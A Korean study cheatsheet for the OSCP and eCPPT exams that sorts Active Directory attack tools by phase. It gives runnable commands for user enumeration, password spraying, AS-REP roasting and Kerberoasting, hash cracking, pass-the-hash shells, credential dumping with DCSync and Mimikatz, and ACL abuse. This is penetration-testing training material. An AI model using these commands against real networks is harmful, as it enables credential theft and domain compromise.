---
title: "Active Directory 도구 (AD Tools)"
date: 2026-06-20
weight: 90
draft: false
tags: ["oscp", "cheatsheet"]
summary: "AD 도구를 하는 일 기준으로 정리. 역할, 사용 시점, OSCP 사용 가능 여부를 함께 표기."
---

AD 도구 총정리 — 이름순이 아니라 하는 일 기준으로 정리. 각 도구마다 역할, 사용 시점, eCPPT 사용 가능 여부, OSCP 사용 가능 여부를 표기.

- 출처: https://heretek.dev/oscp-cheatsheet/active-directory-tools/ (Jean Romero) — 재구성
- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP
- 코드의 `<IP>`, `<DC_IP>`, `<DOMAIN>`, `<USER>`, `<PASS>`, `<NTLM_HASH>` 등은 발견한 값으로 치환

## 유저명 찾기 (Phase 1 — creds 불필요)

### nxc (NetExec / CrackMapExec)

- 역할: AD 만능칼. SMB, LDAP, WinRM 통신. 유저·공유·그룹 열거, 패스워드 스프레이, creds 동작 확인, 해시 덤프.
- 사용 시점: 체인 거의 모든 단계. 기본 도구.
- eCPPT: 사용 가능 (다수 리뷰어 확인)
- OSCP: 사용 가능
- 주요 명령:

```bash
nxc smb <IP> -u '' -p '' --users           # 유저 열거 (null 세션)
nxc smb <IP> -u '' -p '' --shares           # 공유 목록 (null 세션)
nxc smb <IP> -u '' -p '' --rid-brute        # RID 브루트포스로 유저 찾기
nxc smb <IP> -u 'USER' -p 'PASS' --users   # 유저 열거 (creds 있음)
nxc smb <IP> -u 'USER' -p 'PASS' --shares  # 공유 목록 (creds 있음)
nxc smb <IP> -u users.txt -p 'Password1!' --continue-on-success  # 패스워드 스프레이
nxc smb <SUBNET>/24 -u 'USER' -p 'PASS'    # creds가 통하는 곳 확인 (Pwn3d! = admin)
nxc smb <IP> -u 'USER' -p 'PASS' --sam     # 로컬 해시 덤프
nxc smb <IP> -u 'USER' -p 'PASS' --lsa     # LSA secrets 덤프
nxc winrm <IP> -u 'USER' -p 'PASS'         # WinRM 접근 동작 확인
```

### kerbrute

- 역할: Kerberos에 물어 유효한 유저명인지 확인. DC가 유효/무효 유저에 다르게 응답한다.
- 사용 시점: Phase 1 — SMB null 세션이 막혔을 때 유효 유저명 찾기.
- eCPPT: 사용 가능 (시험 Kali에 사전 설치 확인)
- OSCP: 사용 가능 (직접 다운로드)
- 설치 (apt 패키지가 아니다):

```bash
# Go 설치되어 있으면 (확인: which go)
go install github.com/ropnop/kerbrute@latest
sudo cp ~/go/bin/kerbrute /usr/local/bin/kerbrute
sudo chmod +x /usr/local/bin/kerbrute

# ARM64 바이너리가 없으면(애플 실리콘), Go로 소스 빌드 필요
```

- 주요 명령:

```bash
kerbrute userenum -d <DOMAIN> --dc <DC_IP> userlist.txt
```

- 워드리스트 우선순위 (빠른 것부터):

```bash
# 1. 최우선 — 작고 빠르며 실제 AD 환경 대부분을 커버 (~1만 개)
/usr/share/seclists/Usernames/Names/names.txt

# 2. 초소형 — 흔한 서비스 계정만
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# 3. 균형 — 유저명 1만 개
/usr/share/seclists/Usernames/xato-net-10-million-usernames-10000.txt

# 4. 최후 — 1,000만 항목, 몇 시간 걸림
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

- 경고: xato-net-10-million-usernames.txt 로 시작하지 않는다 — 몇 시간 걸린다. names.txt 로 시작하면 대부분의 박스를 몇 초 안에 커버한다.

### rpcclient

- 역할: Windows RPC 직접 통신. null 세션으로 유저·그룹 등 열거 가능.
- 사용 시점: Phase 1 — nxc 가 안 될 때 백업 수단.
- eCPPT: 사용 가능 (Kali 사전 설치)
- OSCP: 사용 가능
- 주요 명령:

```bash
rpcclient -U '' -N <DC_IP> -c 'enumdomusers'
rpcclient -U '' -N <DC_IP> -c 'enumdomgroups'
```

### enum4linux

- 역할: SMB/RPC 자동 열거 스크립트. 여러 열거 쿼리를 한 번에 실행.
- 사용 시점: Phase 1 — 유저·공유·그룹 빠른 자동 스캔.
- eCPPT: 사용 가능 (Kali 사전 설치)
- OSCP: 사용 가능
- 주요 명령:

```bash
enum4linux -U <DC_IP>          # 유저
enum4linux -a <DC_IP>          # 전부
```

### ldapsearch

- 역할: LDAP 디렉터리 직접 질의. 유저, 그룹, description, 기타 AD 속성 검색.
- 사용 시점: Phase 1 — 특정 AD 속성이 필요하거나 익명 LDAP 질의할 때.
- eCPPT: 사용 가능 (Kali 사전 설치)
- OSCP: 사용 가능
- 주요 명령:

```bash
ldapsearch -x -H ldap://<DC_IP> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
```

## creds 없이 해시 얻기 (Phase 2-3)

### impacket-GetNPUsers (AS-REP Roasting)

- 역할: "Kerberos 사전 인증 불필요" 계정을 찾아 패스워드 없이 해시를 받아온다.
- 사용 시점: Phase 2 — 유저명 확보 직후 첫 공격. 어떤 브루트포스보다 먼저.
- eCPPT: 사용 가능
- OSCP: 사용 가능
- 원리: 사전 인증이 꺼진 계정은 DC가 해시를 공짜로 건넨다.
- 주요 명령:

```bash
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile valid_users.txt -format hashcat -outputfile asrep.txt
```

- hashcat 모드: 18200
- john: `john asrep.txt --wordlist=rockyou.txt`

## creds 있이 해시 얻기 (Phase 7)

### impacket-GetUserSPNs (Kerberoasting)

- 역할: SPN 있는 계정의 서비스 티켓을 요청. 티켓은 서비스 계정 패스워드로 암호화되어 있다 — 오프라인 크랙.
- 사용 시점: Phase 7 — 첫 creds 획득 이후. 아무 도메인 유저나 가능.
- eCPPT: 사용 가능
- OSCP: 사용 가능
- 원리: 아무 도메인 유저나 서비스 티켓 요청 가능. DC가 서비스 계정 패스워드 해시로 암호화해 준다.
- 주요 명령:

```bash
impacket-GetUserSPNs <DOMAIN>/'USER':'PASS' -dc-ip <DC_IP> -request -outputfile kerberoast.txt
```

- hashcat 모드: 13100
- john: `john kerberoast.txt --wordlist=rockyou.txt`

### AS-REP vs Kerberoasting — 구분법

- creds 필요 여부 — AS-REP Roasting: 불필요 / Kerberoasting: 필요
- 대상 — AS-REP Roasting: "사전 인증 불가" 유저 / Kerberoasting: SPN 있는 서비스 계정
- impacket 도구 — AS-REP Roasting: GetNPUsers / Kerberoasting: GetUserSPNs
- hashcat 모드 — AS-REP Roasting: 18200 / Kerberoasting: 13100
- 체인 위치 — AS-REP Roasting: Phase 2 (creds 이전) / Kerberoasting: Phase 7 (creds 이후)

## 해시 크랙

### hashcat

- 역할: GPU(또는 CPU)로 해시 크랙. 빠르지만 가끔 버그가 있다.
- eCPPT: 사용 가능 (문제가 생기는 걸로 알려져 있음 — john 백업 필수)
- OSCP: 사용 가능
- 주요 명령:

```bash
hashcat -m 18200 asrep.txt wordlist.txt      # AS-REP 해시
hashcat -m 13100 kerberoast.txt wordlist.txt  # Kerberos TGS 해시
hashcat -m 5600 ntlmv2.txt wordlist.txt       # NTLMv2 해시
hashcat -m 1000 ntlm.txt wordlist.txt         # NTLM 해시
```

### john (John the Ripper)

- eCPPT: 사용 가능
- OSCP: 사용 가능
- 주요 명령:

```bash
john hash.txt --wordlist=rockyou.txt          # 워드리스트 크랙
john hash.txt --show                          # 크랙된 패스워드 표시
```

## 도메인 매핑 (Phase 6)

### bloodhound-python

- 역할: Kali에서 AD 데이터 전부 수집(유저, 그룹, 권한, 컴퓨터). BloodHound GUI용 JSON 생성.
- 사용 시점: Phase 6 — 첫 creds 획득 직후 즉시.
- eCPPT: 사용 가능 (Kali에 있음)
- OSCP: 사용 가능
- 주요 명령:

```bash
bloodhound-python -u 'USER' -p 'PASS' -ns <DC_IP> -d <DOMAIN> -c All
```

### BloodHound GUI (Community Edition)

- 역할: AD 데이터 시각화, Domain Admin까지 공격 경로 표시.
- 사용 시점: bloodhound-python 수집 직후. JSON 업로드, 내 유저 검색, PATHFINDING 사용.
- eCPPT: 사용 가능 (시험 Kali 사전 설치)
- OSCP: 사용 가능
- 주요 동작:

- JSON 파일 업로드 (드래그 앤 드롭)
- 내 유저 검색 → 우클릭 → Mark as Owned
- PATHFINDING: 시작 = 내 유저, 끝 = Domain Admins
- 노드 사이 엣지 클릭 → 관계 유형과 악용 방법 표시

## 쉘 획득 (Phase 8)

### evil-winrm

- 역할: WinRM(5985 포트)으로 Windows 접속. 인터랙티브 PowerShell 쉘. 파일 업/다운로드에 최적.
- 사용 시점: 5985 열려 있고 유효 creds 있을 때.
- eCPPT: 사용 가능하나 고장으로 알려짐 — Docker 우회: `docker run --rm -ti oscarakaelvis/evil-winrm`
- OSCP: 사용 가능
- 주요 명령:

```bash
evil-winrm -i <IP> -u 'USER' -p 'PASS'
evil-winrm -i <IP> -u 'USER' -H '<NTLM_HASH>'    # Pass-the-Hash
```

### impacket-psexec

- 역할: SMB로 타깃에 서비스 생성, SYSTEM 쉘 제공. 시끄럽지만 확실하다.
- 사용 시점: admin creds 있고 SYSTEM 쉘이 필요할 때.
- eCPPT: 사용 가능
- OSCP: 사용 가능
- 주요 명령:

```bash
impacket-psexec '<DOMAIN>/<USER>:<PASS>'@<IP>
impacket-psexec '<DOMAIN>/<USER>'@<IP> -hashes :<NTLM_HASH>    # Pass-the-Hash
```

### impacket-wmiexec

- 역할: psexec과 비슷하나 더 은밀. 서비스 생성 대신 WMI 사용.
- 사용 시점: psexec이 안 되거나 소음을 줄이고 싶을 때.
- eCPPT: 사용 가능
- OSCP: 사용 가능
- 주요 명령:

```bash
impacket-wmiexec '<DOMAIN>/<USER>:<PASS>'@<IP>
```

### xfreerdp

- 역할: RDP 클라이언트. 풀 그래픽 데스크톱 제공.
- 사용 시점: 3389 열려 있거나 GUI 접근이 필요할 때.
- eCPPT: 사용 가능
- OSCP: 사용 가능
- 주요 명령:

```bash
xfreerdp /u:'USER' /p:'PASS' /v:<IP> /cert-ignore
```

## 크리덴셜 덤프 (Phase 9)

### impacket-secretsdump

- 역할: 머신의 모든 해시 덤프(SAM, LSA, NTDS.dit). DCSync로 도메인 전체 해시도 가능.
- 사용 시점: Phase 9 — 장악한 모든 머신에서. Phase 10 — DA 또는 DCSync 권한 있을 때 DCSync.
- eCPPT: 사용 가능
- OSCP: 사용 가능
- 주요 명령:

```bash
impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<IP>              # 전부 덤프
impacket-secretsdump '<DOMAIN>/<USER>'@<IP> -hashes :<HASH>    # 해시로
impacket-secretsdump -just-dc-ntlm '<DOMAIN>/<USER>:<PASS>'@<DC_IP>  # DC 전용 — 도메인 전체 해시
```

### Meterpreter + Kiwi (Metasploit)

- 역할: Metasploit 내장 크리덴셜 덤퍼. Kiwi 확장(Mimikatz) 로드 후 해시, 패스워드, 티켓 덤프.
- 사용 시점: 장악한 머신에서 Meterpreter 쉘이 있을 때.
- eCPPT: 사용 가능 — 제한 없음 (모든 머신에 사용)
- OSCP: 제한적 — 한 머신만
- 주요 명령:

```text
meterpreter> load kiwi
meterpreter> creds_all            # 메모리의 모든 크리덴셜
meterpreter> lsa_dump_sam         # 로컬 계정 해시
meterpreter> lsa_dump_secrets     # 서비스 계정 패스워드
meterpreter> hashdump             # 빠른 NTLM 해시 덤프
```

## AD 객체 수정 (ACL 악용)

### net rpc

- 역할: Kali에서 AD 그룹·유저 패스워드 원격 수정. Linux 내장 명령.
- 사용 시점: BloodHound가 그룹에 GenericAll(자신 추가) 또는 유저에 ForceChangePassword 를 보여줄 때.
- eCPPT: 사용 가능 (Linux/Kali 내장)
- OSCP: 사용 가능
- 주요 명령:

```bash
# 유저를 그룹에 추가
net rpc group addmem "GROUP_NAME" "USERNAME" -U '<DOMAIN>/<USER>%<PASS>' -S <DC_IP>

# 유저 패스워드 변경
net rpc password "TARGET_USER" "NewP@ss123!" -U '<DOMAIN>/<USER>%<PASS>' -S <DC_IP>
```

### impacket-dacledit

- 역할: AD 객체 권한(ACL/DACL) 수정. DCSync 권한 부여 가능.
- 사용 시점: BloodHound가 도메인에 WriteDACL 을 보여줄 때.
- eCPPT: 시험 Kali에 있는지 확실치 않음 (최신 도구)
- OSCP: 사용 가능 여부 불확실
- 주요 명령:

```bash
impacket-dacledit -action 'write' -rights 'DCSync' -principal 'USER' '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>
```

- 없을 경우 대체: Windows 쉘 또는 evil-winrm 에서 PowerView 사용

## 시험 핵심 리마인더

### eCPPT 전용

- Metasploit 제한 없음 — 모든 곳에 사용
- Desktop 워드리스트 순서: common_corporate_passwords.lst → seasons.txt → months.txt → xato-10k → rockyou
- Evil-WinRM 고장일 수 있다 — Docker 우회 사용
- hashcat 버그일 수 있다 — john 백업 사용
- 인터넷 불가 — 사전 설치된 도구만
- 해시 저장 시 항상 작은따옴표: `echo '$hash' > file.txt`

### OSCP 전용

- Metasploit은 한 머신만
- 리포트 작성 필수
- AI/LLM 사용 금지
- 감독(Proctored) 시험

### 공통

- 새 크리덴셜 발견 → 즉시 전 머신에 스프레이
- 장악한 모든 머신에서 creds 덤프
- 모든 creds를 표에 기록: username / password-hash / source / where it works
